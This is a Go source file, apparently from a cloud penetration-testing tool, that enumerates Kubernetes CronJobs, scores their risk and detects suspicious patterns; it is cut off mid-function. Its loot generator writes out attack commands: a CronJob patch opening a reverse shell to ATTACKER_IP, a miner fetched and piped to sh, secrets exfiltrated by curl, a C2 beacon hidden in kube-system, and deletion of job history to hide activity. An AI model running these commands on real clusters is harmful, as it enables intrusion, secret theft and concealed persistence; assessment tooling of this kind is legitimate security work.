package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	batchv1 "k8s.io/api/batch/v1"
	v1 "k8s.io/api/core/v1"
	"k8s.io/client-go/kubernetes"
)

var CronJobsCmd = &cobra.Command{
	Use:     "cronjobs",
	Aliases: []string{"cj"},
	Short:   "List all cluster CronJobs",
	Long: `
List all cluster CronJobs:
  cloudfox kubernetes cronjobs`,
	Run: ListCronJobs,
}

type CronJobsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t CronJobsOutput) TableFiles() []internal.TableFile { return t.Table }
func (t CronJobsOutput) LootFiles() []internal.LootFile   { return t.Loot }

type CronJobFinding struct {
	Namespace             string
	Name                  string
	Schedule              string
	SecurityIssues        []string
	RiskScore             int
	Suspend               bool
	ConcurrencyPolicy     string
	BackdoorPatterns      []string
	ReverseShells         []string
	CryptoMiners          []string
	DataExfiltration      []string
	ContainerEscape       []string
	ScheduleAnalysis      string
	SuccessfulJobsHistory int32
	FailedJobsHistory     int32
	ServiceAccount        string
	Containers            []CronJobContainer
	ImageRegistry         string
	ImageTags             []string
	HostPID               bool
	HostIPC               bool
	HostNetwork           bool
	Privileged            bool
	Capabilities          []string
	HostPaths             []string
	Volumes               []CronJobVolume
	Labels                map[string]string
	Annotations           map[string]string
	InitContainers        int
	ImagePullSecrets      []string
	Secrets               []string
	ConfigMaps            []string
	Affinity              string
	Tolerations           []string
	CloudProvider         string
	CloudRole             string
	Commands              []string
	Args                  []string
	EnvVars               []string
	CreationTimestamp     string
}

type CronJobContainer struct {
	Name             string
	Image            string
	Tag              string
	Registry         string
	Command          string
	Args             string
	Privileged       bool
	Capabilities     []string
	RunAsUser        string
	AllowPrivEsc     string
	ReadOnlyRootFS   string
	ResourceLimits   string
	ResourceRequests string
	EnvVarCount      int
}

type CronJobVolume struct {
	Name       string
	VolumeType string
	Source     string
	MountPath  string
	ReadOnly   bool
}

func ListCronJobs(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	// Extract global flags
	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating cronjobs for %s", globals.ClusterName), globals.K8S_CRONJOBS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	// Fetch all cronjobs using cached call
	allCronJobs, err := sdk.GetCronJobs(ctx, clientset)
	if err != nil {
		shared.LogListError(&logger, "cronjobs", "", err, globals.K8S_CRONJOBS_MODULE_NAME, true)
		return
	}

	// Filter by target namespaces if specified
	namespaces := shared.GetTargetNamespaces(ctx, clientset, &logger, globals.K8S_CRONJOBS_MODULE_NAME)
	targetNamespaces := make(map[string]struct{})
	for _, ns := range namespaces {
		targetNamespaces[ns] = struct{}{}
	}
	var filteredCronJobs []batchv1.CronJob
	for _, cj := range allCronJobs {
		if len(targetNamespaces) > 0 {
			if _, ok := targetNamespaces[cj.Namespace]; !ok {
				continue
			}
		}
		filteredCronJobs = append(filteredCronJobs, cj)
	}

	// Table 1: CronJobs Summary
	summaryHeaders := []string{
		"Namespace", "Name", "Labels", "Schedule", "Schedule Analysis",
		"Concurrency Policy", "Suspend", "Job History",
		"Service Account", "Init Containers", "Image Pull Secrets",
		"Secrets", "ConfigMaps",
		"Security Context", "Suspicious Patterns", "Cloud IAM",
		"Affinity", "Tolerations",
	}

	// Table 2: CronJob-Containers Detail
	containerHeaders := []string{
		"Namespace", "CronJob", "Container", "Privileged", "Capabilities",
		"RunAsUser", "AllowPrivEsc", "ReadOnlyRootFS", "Resource Limits",
		"Image", "Tag", "Registry",
	}

	// Table 3: CronJob-Volumes Detail
	volumeHeaders := []string{
		"Namespace", "CronJob", "Volume Name", "Type", "Source Path/Name", "Container Mount Path", "Read Only",
	}

	var summaryRows [][]string
	var containerRows [][]string
	var volumeRows [][]string
	var findings []CronJobFinding

	for _, cj := range filteredCronJobs {
		podSpec := cj.Spec.JobTemplate.Spec.Template.Spec

		// Get success/failed history limits with defaults
		successHistory := int32(3)
		failedHistory := int32(1)
		if cj.Spec.SuccessfulJobsHistoryLimit != nil {
			successHistory = *cj.Spec.SuccessfulJobsHistoryLimit
		}
		if cj.Spec.FailedJobsHistoryLimit != nil {
			failedHistory = *cj.Spec.FailedJobsHistoryLimit
		}

		suspend := false
		if cj.Spec.Suspend != nil {
			suspend = *cj.Spec.Suspend
		}

		// Run comprehensive security analysis
		finding := analyzeCronJobSecurity(
			ctx,
			clientset,
			cj.Namespace,
			cj.Name,
			cj.Spec.Schedule,
			suspend,
			string(cj.Spec.ConcurrencyPolicy),
			successHistory,
			failedHistory,
			podSpec,
			cj.Spec.JobTemplate.Spec.Template.Annotations,
		)

		// Calculate risk score for internal prioritization
		finding.RiskScore = calculateCronJobRiskScore(&finding)

		findings = append(findings, finding)

		// Merge all suspicious patterns into one column
		suspiciousPatternsStr := strings.Join(finding.BackdoorPatterns, "; ")

		// Merge job history
		jobHistoryStr := fmt.Sprintf("Success: %d, Failed: %d", finding.SuccessfulJobsHistory, finding.FailedJobsHistory)

		// Merge security context - only show pod-level settings that are enabled
		var secContextParts []string
		if finding.HostPID {
			secContextParts = append(secContextParts, "HostPID")
		}
		if finding.HostIPC {
			secContextParts = append(secContextParts, "HostIPC")
		}
		if finding.HostNetwork {
			secContextParts = append(secContextParts, "HostNetwork")
		}
		for _, hp := range finding.HostPaths {
			secContextParts = append(secContextParts, fmt.Sprintf("HostPath:%s", hp))
		}
		secContextStr := strings.Join(secContextParts, ", ")

		// Merge cloud provider and role
		var cloudIAMStr string
		if finding.CloudProvider != "" && finding.CloudRole != "" {
			cloudIAMStr = fmt.Sprintf("%s: %s", finding.CloudProvider, finding.CloudRole)
		}

		// Format labels for display
		var labelParts []string
		for k, v := range finding.Labels {
			labelParts = append(labelParts, fmt.Sprintf("%s=%s", k, v))
		}
		labelsStr := strings.Join(labelParts, ", ")

		// Format init containers count
		initContainersStr := ""
		if finding.InitContainers > 0 {
			initContainersStr = fmt.Sprintf("%d", finding.InitContainers)
		}

		// Format image pull secrets
		imagePullSecretsStr := strings.Join(finding.ImagePullSecrets, ", ")

		// Format secrets
		secretsStr := strings.Join(finding.Secrets, ", ")

		// Format configmaps
		configMapsStr := strings.Join(finding.ConfigMaps, ", ")

		// Format tolerations
		tolerationsStr := strings.Join(finding.Tolerations, ", ")

		// Table 1: Summary row
		summaryRow := []string{
			finding.Namespace,
			finding.Name,
			k8sinternal.NonEmpty(labelsStr),
			finding.Schedule,
			finding.ScheduleAnalysis,
			finding.ConcurrencyPolicy,
			fmt.Sprintf("%v", finding.Suspend),
			jobHistoryStr,
			k8sinternal.NonEmpty(finding.ServiceAccount),
			k8sinternal.NonEmpty(initContainersStr),
			k8sinternal.NonEmpty(imagePullSecretsStr),
			k8sinternal.NonEmpty(secretsStr),
			k8sinternal.NonEmpty(configMapsStr),
			k8sinternal.NonEmpty(secContextStr),
			k8sinternal.NonEmpty(suspiciousPatternsStr),
			k8sinternal.NonEmpty(cloudIAMStr),
			k8sinternal.NonEmpty(finding.Affinity),
			k8sinternal.NonEmpty(tolerationsStr),
		}
		summaryRows = append(summaryRows, summaryRow)

		// Table 2: Container rows (one per container)
		for _, container := range finding.Containers {
			// Format capabilities
			capsStr := strings.Join(container.Capabilities, ", ")

			containerRow := []string{
				finding.Namespace,
				finding.Name,
				container.Name,
				fmt.Sprintf("%v", container.Privileged),
				k8sinternal.NonEmpty(capsStr),
				container.RunAsUser,
				container.AllowPrivEsc,
				container.ReadOnlyRootFS,
				k8sinternal.NonEmpty(container.ResourceLimits),
				container.Image,
				container.Tag,
				container.Registry,
			}
			containerRows = append(containerRows, containerRow)
		}

		// Table 3: Volume rows (one per volume)
		for _, volume := range finding.Volumes {
			volumeRow := []string{
				finding.Namespace,
				finding.Name,
				volume.Name,
				volume.VolumeType,
				volume.Source,
				volume.MountPath,
				fmt.Sprintf("%v", volume.ReadOnly),
			}
			volumeRows = append(volumeRows, volumeRow)
		}
	}

	// Generate comprehensive loot files
	lootFiles := generateCronJobLoot(findings, globals.KubeContext)

	// Create all three tables
	summaryTable := internal.TableFile{Name: "CronJobs", Header: summaryHeaders, Body: summaryRows}
	containerTable := internal.TableFile{Name: "CronJob-Containers", Header: containerHeaders, Body: containerRows}
	volumeTable := internal.TableFile{Name: "CronJob-Volumes", Header: volumeHeaders, Body: volumeRows}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"CronJobs",
		globals.ClusterName,
		"results",
		CronJobsOutput{Table: []internal.TableFile{summaryTable, containerTable, volumeTable}, Loot: lootFiles},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_CRONJOBS_MODULE_NAME)
		return
	}

	if len(summaryRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d cronjobs found", len(summaryRows)), globals.K8S_CRONJOBS_MODULE_NAME)
	} else {
		logger.InfoM("No cronjobs found, skipping output file creation", globals.K8S_CRONJOBS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_CRONJOBS_MODULE_NAME), globals.K8S_CRONJOBS_MODULE_NAME)
}

// --- local formatters ---
func formatAffinity(affinity *v1.Affinity) string {
	if affinity == nil {
		return ""
	}
	b, err := json.Marshal(affinity)
	if err != nil {
		return ""
	}
	return string(b)
}

func formatTolerations(tols []v1.Toleration) string {
	if len(tols) == 0 {
		return ""
	}
	b, err := json.Marshal(tols)
	if err != nil {
		return ""
	}
	return string(b)
}

// --- Security Analysis Functions ---

func analyzeSchedule(schedule string) (string, string) {
	// Returns (analysis string, risk level)
	// Cron format: minute hour day month weekday
	parts := strings.Fields(schedule)
	if len(parts) < 5 {
		return "Invalid schedule format", "UNKNOWN"
	}

	minute := parts[0]
	hour := parts[1]

	// CRITICAL: Every minute (crypto miner pattern)
	if schedule == "* * * * *" {
		return "Runs EVERY MINUTE - typical crypto miner behavior", shared.RiskCritical
	}

	// CRITICAL: Every 2-5 minutes
	if minute == "*/2" || minute == "*/3" || minute == "*/4" || minute == "*/5" {
		return fmt.Sprintf("Runs every %s minutes - very frequent execution", minute), shared.RiskHigh
	}

	// HIGH: Off-hours execution (2am - 5am) - backdoor/exfiltration pattern
	if hour == "2" || hour == "3" || hour == "4" {
		return fmt.Sprintf("Runs at %s:00 (off-hours) - potential backdoor or exfiltration", hour), shared.RiskHigh
	}

	// MEDIUM: Every 10-15 minutes
	if minute == "*/10" || minute == "*/15" {
		return "Runs every 10-15 minutes - frequent execution", shared.RiskMedium
	}

	// MEDIUM: Multiple times per hour
	if strings.Contains(minute, ",") && len(strings.Split(minute, ",")) >= 4 {
		return "Runs multiple times per hour", shared.RiskMedium
	}

	// LOW: Normal schedule
	return "Normal schedule pattern", shared.RiskLow
}

func analyzeCronJobSecurity(
	ctx context.Context,
	clientset *kubernetes.Clientset,
	namespace string,
	name string,
	schedule string,
	suspend bool,
	concurrencyPolicy string,
	successHistory int32,
	failedHistory int32,
	podSpec v1.PodSpec,
	annotations map[string]string,
) CronJobFinding {

	finding := CronJobFinding{
		Namespace:             namespace,
		Name:                  name,
		Schedule:              schedule,
		Suspend:               suspend,
		ConcurrencyPolicy:     concurrencyPolicy,
		SuccessfulJobsHistory: successHistory,
		FailedJobsHistory:     failedHistory,
		ServiceAccount:        podSpec.ServiceAccountName,
		HostPID:               podSpec.HostPID,
		HostIPC:               podSpec.HostIPC,
		HostNetwork:           podSpec.HostNetwork,
		Labels:                annotations, // Using annotations as labels for now
		Annotations:           annotations,
		InitContainers:        len(podSpec.InitContainers),
	}

	// Image Pull Secrets
	for _, ps := range podSpec.ImagePullSecrets {
		finding.ImagePullSecrets = append(finding.ImagePullSecrets, ps.Name)
	}

	// Affinity
	if podSpec.Affinity != nil {
		finding.Affinity = k8sinternal.PrettyPrintAffinity(podSpec.Affinity)
	}

	// Tolerations - full details
	for _, t := range podSpec.Tolerations {
		tolStr := ""
		if t.Key != "" {
			tolStr = t.Key
			if t.Value != "" {
				tolStr += "=" + t.Value
			}
		} else {
			tolStr = "*"
		}
		if t.Effect != "" {
			tolStr += ":" + string(t.Effect)
		}
		tolStr += fmt.Sprintf(" (%s)", t.Operator)
		if t.TolerationSeconds != nil {
			tolStr += fmt.Sprintf(" [%ds]", *t.TolerationSeconds)
		}
		finding.Tolerations = append(finding.Tolerations, tolStr)
	}

	// Extract containers, commands, args, images
	var containers []CronJobContainer
	var allCommands []string
	var allArgs []string
	var allImages []string
	var allEnvVars []string
	var capabilities []string
	privileged := false

	for _, c := range podSpec.Containers {
		// Parse image into components
		image := c.Image
		tag := "latest"
		registry := "docker.io"

		if strings.Contains(image, ":") {
			parts := strings.SplitN(image, ":", 2)
			image = parts[0]
			tag = parts[1]
		}
		if strings.Contains(image, "/") {
			parts := strings.Split(image, "/")
			if strings.Contains(parts[0], ".") || parts[0] == "localhost" {
				registry = parts[0]
			}
		}

		// Check for privileged and capabilities
		// Kubernetes defaults when not specified:
		// - RunAsUser: inherits from image (usually root/0)
		// - AllowPrivilegeEscalation: true
		// - ReadOnlyRootFilesystem: false
		containerPrivileged := false
		var containerCaps []string
		containerRunAsUser := "0 (default)"
		containerAllowPrivEsc := "true (default)"
		containerReadOnlyRootFS := "false (default)"
		if c.SecurityContext != nil {
			if c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
				containerPrivileged = true
				privileged = true
			}
			if c.SecurityContext.Capabilities != nil {
				for _, cap := range c.SecurityContext.Capabilities.Add {
					containerCaps = append(containerCaps, "ADD:"+string(cap))
					capabilities = append(capabilities, "ADD:"+string(cap))
				}
				for _, cap := range c.SecurityContext.Capabilities.Drop {
					containerCaps = append(containerCaps, "DROP:"+string(cap))
					capabilities = append(capabilities, "DROP:"+string(cap))
				}
			}
			if c.SecurityContext.RunAsUser != nil {
				uid := *c.SecurityContext.RunAsUser
				if uid == 0 {
					containerRunAsUser = "0 (root)"
				} else {
					containerRunAsUser = fmt.Sprintf("%d", uid)
				}
			}
			if c.SecurityContext.AllowPrivilegeEscalation != nil {
				if *c.SecurityContext.AllowPrivilegeEscalation {
					containerAllowPrivEsc = "true"
				} else {
					containerAllowPrivEsc = "FALSE"
				}
			}
			if c.SecurityContext.ReadOnlyRootFilesystem != nil {
				if *c.SecurityContext.ReadOnlyRootFilesystem {
					containerReadOnlyRootFS = "TRUE"
				} else {
					containerReadOnlyRootFS = "false"
				}
			}
		}

		// Resource limits and requests
		var limitsStr, requestsStr string
		if c.Resources.Limits != nil {
			var limitParts []string
			if cpu, ok := c.Resources.Limits["cpu"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("cpu:%s", cpu.String()))
			}
			if mem, ok := c.Resources.Limits["memory"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("mem:%s", mem.String()))
			}
			limitsStr = strings.Join(limitParts, ", ")
		}
		if c.Resources.Requests != nil {
			var reqParts []string
			if cpu, ok := c.Resources.Requests["cpu"]; ok {
				reqParts = append(reqParts, fmt.Sprintf("cpu:%s", cpu.String()))
			}
			if mem, ok := c.Resources.Requests["memory"]; ok {
				reqParts = append(reqParts, fmt.Sprintf("mem:%s", mem.String()))
			}
			requestsStr = strings.Join(reqParts, ", ")
		}

		container := CronJobContainer{
			Name:             c.Name,
			Image:            c.Image,
			Tag:              tag,
			Registry:         registry,
			Command:          strings.Join(c.Command, " "),
			Args:             strings.Join(c.Args, " "),
			Privileged:       containerPrivileged,
			Capabilities:     containerCaps,
			RunAsUser:        containerRunAsUser,
			AllowPrivEsc:     containerAllowPrivEsc,
			ReadOnlyRootFS:   containerReadOnlyRootFS,
			ResourceLimits:   limitsStr,
			ResourceRequests: requestsStr,
			EnvVarCount:      len(c.Env),
		}
		containers = append(containers, container)

		allImages = append(allImages, c.Image)
		allCommands = append(allCommands, c.Command...)
		allArgs = append(allArgs, c.Args...)

		// Collect environment variables
		for _, env := range c.Env {
			if env.Value != "" {
				allEnvVars = append(allEnvVars, fmt.Sprintf("%s=%s", env.Name, env.Value))
			}
		}
	}

	finding.Containers = containers
	finding.Commands = allCommands
	finding.Args = allArgs
	finding.Privileged = privileged
	finding.Capabilities = capabilities
	finding.EnvVars = allEnvVars

	// Extract image registry and tags
	if len(allImages) > 0 {
		// Get registry from first image
		img := allImages[0]
		if strings.Contains(img, "/") {
			parts := strings.Split(img, "/")
			finding.ImageRegistry = parts[0]
		}

		// Extract tags
		for _, img := range allImages {
			if strings.Contains(img, ":") {
				tag := strings.Split(img, ":")[1]
				finding.ImageTags = append(finding.ImageTags, tag)
			}
		}
	}

	// Extract volumes and hostPaths
	var volumes []CronJobVolume
	var hostPaths []string
	for _, v := range podSpec.Volumes {
		volume := CronJobVolume{
			Name: v.Name,
		}

		// Determine volume type and source
		if v.HostPath != nil {
			volume.VolumeType = "HostPath"
			volume.Source = v.HostPath.Path
			hostPaths = append(hostPaths, v.HostPath.Path)
		} else if v.Secret != nil {
			volume.VolumeType = "Secret"
			volume.Source = v.Secret.SecretName
			finding.Secrets = append(finding.Secrets, v.Secret.SecretName)
		} else if v.ConfigMap != nil {
			volume.VolumeType = "ConfigMap"
			volume.Source = v.ConfigMap.Name
			finding.ConfigMaps = append(finding.ConfigMaps, v.ConfigMap.Name)
		} else if v.EmptyDir != nil {
			volume.VolumeType = "EmptyDir"
			volume.Source = "-"
		} else if v.PersistentVolumeClaim != nil {
			volume.VolumeType = "PVC"
			volume.Source = v.PersistentVolumeClaim.ClaimName
		} else if v.Projected != nil {
			volume.VolumeType = "Projected"
			volume.Source = "-"
		} else if v.DownwardAPI != nil {
			volume.VolumeType = "DownwardAPI"
			volume.Source = "-"
		} else {
			volume.VolumeType = "Other"
			volume.Source = "-"
		}

		// Find mount path and read-only status
		for _, container := range podSpec.Containers {
			for _, vm := range container.VolumeMounts {
				if vm.Name == v.Name {
					volume.MountPath = vm.MountPath
					volume.ReadOnly = vm.ReadOnly
					break
				}
			}
		}

		volumes = append(volumes, volume)
	}
	finding.Volumes = volumes
	finding.HostPaths = hostPaths

	// Cloud role detection
	if podSpec.ServiceAccountName != "" {
		roleResults := k8sinternal.DetectCloudRole(
			ctx,
			clientset,
			namespace,
			podSpec.ServiceAccountName,
			&podSpec,
			annotations,
		)
		if len(roleResults) > 0 {
			finding.CloudProvider = roleResults[0].Provider
			finding.CloudRole = roleResults[0].Role
		}
	}

	// Run security detection
	finding.ReverseShells = shared.DetectReverseShells(allCommands, allArgs)
	finding.CryptoMiners = shared.DetectCryptoMiners(allCommands, allArgs, allImages)
	finding.DataExfiltration = shared.DetectDataExfiltration(allCommands, allArgs)
	finding.ContainerEscape = shared.DetectContainerEscape(allCommands, allArgs, hostPaths)

	// Combine all backdoor patterns
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ReverseShells...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.CryptoMiners...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.DataExfiltration...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ContainerEscape...)

	// Schedule analysis
	scheduleAnalysis, scheduleRisk := analyzeSchedule(schedule)
	finding.ScheduleAnalysis = scheduleAnalysis

	// Generate security issues
	finding.SecurityIssues = generateCronJobSecurityIssues(finding, scheduleRisk)

	return finding
}

// calculateCronJobRiskScore calculates risk score 0-100 based on security factors
func calculateCronJobRiskScore(finding *CronJobFinding) int {
	score := 0

	// CRITICAL: Malicious activity patterns (highest priority)
	if len(finding.ReverseShells) > 0 {
		score += 95 // Reverse shell = immediate threat
	}
	if len(finding.CryptoMiners) > 0 {
		score += 90 // Crypto mining = active abuse
	}
	if len(finding.DataExfiltration) > 0 {
		score += 85 // Data exfiltration = data theft
	}
	if len(finding.ContainerEscape) > 0 {
		score += 80 // Container escape techniques
	}

	// HIGH: Schedule frequency (crypto miner / backdoor pattern)
	if finding.Schedule == "* * * * *" {
		score += 70 // Every minute = crypto miner pattern
	} else {
		// Check for very frequent schedules
		parts := strings.Fields(finding.Schedule)
		if len(parts) >= 2 {
			minute := parts[0]
			hour := parts[1]

			// Every 2-5 minutes
			if minute == "*/2" || minute == "*/3" || minute == "*/4" || minute == "*/5" {
				score += 55
			}

			// Off-hours execution (2am-5am) - backdoor/exfiltration pattern
			if hour == "2" || hour == "3" || hour == "4" {
				score += 50
			}

			// Every 10-15 minutes
			if minute == "*/10" || minute == "*/15" {
				score += 30
			}
		}
	}

	// HIGH: Privileged access
	if finding.Privileged {
		score += 75
		// Privileged + host namespace = critical
		if finding.HostPID || finding.HostNetwork || finding.HostIPC {
			score += 25 // Bonus for combination
		}
	}

	// MEDIUM-HIGH: Host namespace access
	if finding.HostPID {
		score += 60 // Can view/kill host processes
	}
	if finding.HostNetwork {
		score += 50 // Access to host network
	}
	if finding.HostIPC {
		score += 45 // Access to host IPC
	}

	// MEDIUM-HIGH: Dangerous host paths
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			score += 80 // Container runtime socket = cluster admin
		} else if hp == "/" || hp == "/:" {
			score += 70 // Root filesystem
		} else if strings.Contains(hp, "/etc/kubernetes") || strings.Contains(hp, "kubelet") {
			score += 65 // K8s secrets
		} else if strings.Contains(hp, "/var/run") || strings.Contains(hp, "/etc") {
			score += 40 // Sensitive system paths
		} else {
			score += 20 // Any hostPath is a risk
		}
	}

	// MEDIUM: Dangerous capabilities
	dangerousCaps := map[string]int{
		"SYS_ADMIN":       70,
		"SYS_MODULE":      65,
		"SYS_RAWIO":       50,
		"SYS_PTRACE":      50,
		"DAC_READ_SEARCH": 40,
		"DAC_OVERRIDE":    35,
		"NET_ADMIN":       35,
		"SYS_BOOT":        45,
		"SYS_TIME":        30,
		"MAC_ADMIN":       40,
		"MAC_OVERRIDE":    35,
	}
	for _, cap := range finding.Capabilities {
		for dangerousCap, capScore := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				score += capScore
				break
			}
		}
	}

	// MEDIUM: Active status
	if !finding.Suspend {
		// Active cronjob with malicious patterns is more dangerous
		if len(finding.BackdoorPatterns) > 0 {
			score += 40
		} else {
			score += 10 // Active but no malicious patterns
		}
	} else {
		// Suspended cronjobs with malicious patterns are dormant backdoors
		if len(finding.BackdoorPatterns) > 0 {
			score += 15
		}
	}

	// MEDIUM: Concurrency policy
	if finding.ConcurrencyPolicy == "Allow" {
		score += 15 // Multiple jobs can run simultaneously
	}

	// LOW-MEDIUM: Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			score += 35 // Admin role = elevated cloud permissions
		} else {
			score += 20 // Any cloud role is a risk
		}
	}

	// LOW-MEDIUM: Service account
	if finding.ServiceAccount == "default" {
		score += 5 // Using default service account
	}

	// LOW: Failed job history (potential misconfiguration or detection)
	if finding.FailedJobsHistory > 5 {
		score += 10
	}

	// Cap score at 100
	if score > 100 {
		score = 100
	}

	return score
}

func generateCronJobLoot(findings []CronJobFinding, kubeContext string) []internal.LootFile {
	var lootContent []string
	var entrypointsContent []string

	// Sort all findings by RiskScore descending for prioritization
	sort.Slice(findings, func(i, j int) bool {
		return findings[i].RiskScore > findings[j].RiskScore
	})

	// Collect suspicious findings (those with security issues or suspicious patterns)
	var suspicious []CronJobFinding
	for _, f := range findings {
		if len(f.SecurityIssues) > 0 || len(f.BackdoorPatterns) > 0 || len(f.CryptoMiners) > 0 ||
			len(f.ReverseShells) > 0 || len(f.DataExfiltration) > 0 || len(f.ContainerEscape) > 0 {
			suspicious = append(suspicious, f)
		}
	}

	// ========================================
	// CronJob-Commands.txt - Consolidated commands
	// ========================================
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "##### CronJob Commands")
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "")

	if kubeContext != "" {
		lootContent = append(lootContent, fmt.Sprintf("kubectl config use-context %s", kubeContext))
		lootContent = append(lootContent, "")
	}

	// === ENUMERATION ===
	lootContent = append(lootContent, "=== ENUMERATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List all cronjobs with their schedules")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,SCHEDULE:.spec.schedule,SUSPEND:.spec.suspend,ACTIVE:.status.active,LAST-SCHEDULE:.status.lastScheduleTime")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs running every minute (crypto miner pattern)")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.schedule == \"* * * * *\") | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs with privileged containers")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.containers[]?.securityContext?.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs with hostPID/hostIPC/hostNetwork")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.hostPID == true or .spec.jobTemplate.spec.template.spec.hostIPC == true or .spec.jobTemplate.spec.template.spec.hostNetwork == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs with hostPath volumes")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.volumes[]?.hostPath != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List all jobs created by cronjobs")
	lootContent = append(lootContent, "kubectl get jobs -A --show-labels")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List failed jobs")
	lootContent = append(lootContent, "kubectl get jobs -A --field-selector status.successful!=1")
	lootContent = append(lootContent, "")

	// === SUSPICIOUS CRONJOBS ===
	if len(suspicious) > 0 {
		lootContent = append(lootContent, "=== SUSPICIOUS CRONJOBS ===")
		lootContent = append(lootContent, "")

		for _, f := range suspicious {
			lootContent = append(lootContent, shared.FormatSuspiciousEntry(f.Namespace, f.Name, f.SecurityIssues)...)
			lootContent = append(lootContent, fmt.Sprintf("kubectl get cronjob %s -n %s -o yaml", f.Name, f.Namespace))
			lootContent = append(lootContent, fmt.Sprintf("kubectl describe cronjob %s -n %s", f.Name, f.Namespace))
			lootContent = append(lootContent, "")
		}
	}

	// === EXPLOITATION ===
	lootContent = append(lootContent, "=== EXPLOITATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Modify existing cronjob to add reverse shell")
	lootContent = append(lootContent, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"jobTemplate\":{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"<container>\",\"command\":[\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"]}]}}}}}}'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Deploy crypto miner cronjob")
	lootContent = append(lootContent, "kubectl create cronjob miner --image=alpine --schedule=\"* * * * *\" -- sh -c 'wget -O - http://POOL/miner.sh | sh'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Exfiltrate secrets via cronjob")
	lootContent = append(lootContent, "kubectl create cronjob exfil --image=alpine --schedule=\"0 3 * * *\" -- sh -c 'kubectl get secrets -A -o json | curl -X POST -d @- http://ATTACKER_IP/secrets'")
	lootContent = append(lootContent, "")

	// === PERSISTENCE ===
	lootContent = append(lootContent, "=== PERSISTENCE ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Use suspended cronjob as dormant backdoor")
	lootContent = append(lootContent, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"suspend\":true}}'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Hide in system namespaces with innocuous names")
	lootContent = append(lootContent, "kubectl create cronjob kube-system-check -n kube-system --image=alpine --schedule=\"0 4 * * *\" -- sh -c 'curl http://c2/beacon'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Delete completed jobs to hide activity")
	lootContent = append(lootContent, "kubectl delete jobs -n <namespace> --field-selector status.successful=1")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Disable job history retention")
	lootContent = append(lootContent, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"successfulJobsHistoryLimit\":0,\"failedJobsHistoryLimit\":0}}'")
	lootContent = append(lootContent, "")

	// ========================================
	// CronJob-Entrypoints.txt - Container startup commands
	// ========================================
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "##### CronJob Container Entrypoints")
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "# Only containers with commands or args are shown")
	entrypointsContent = append(entrypointsContent, "")

